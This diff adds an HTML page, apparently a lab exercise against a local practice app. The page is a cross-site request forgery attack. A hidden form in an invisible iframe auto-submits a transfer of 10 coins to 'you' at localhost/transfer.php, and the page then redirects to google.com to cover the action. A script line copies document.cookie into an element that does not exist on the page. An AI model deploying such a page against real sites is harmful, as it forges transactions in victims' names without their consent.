@@ -1,0 +1,22 @@
+derp
+
+
+<iframe name="hiddenFrame" class="hide" style="display:none;"></iframe>
+
+<form id="derp" name="sendcoins" method="POST"
+  action="localhost/transfer.php" target="hiddenFrame">
+ <input type="hidden" name="recipient" value="you" >
+ <input type="hidden" name="coins" value="10">
+ <input type="hidden" name="submission" value="Send">
+</form>
+
+<script>
+document.getElementById("herp").value = document.cookie;
+
+document.getElementById("derp").submit();
+
+document.location="http://google.com";
+//document.location="http://yesiamparanoid.com";
+</script>
+
+
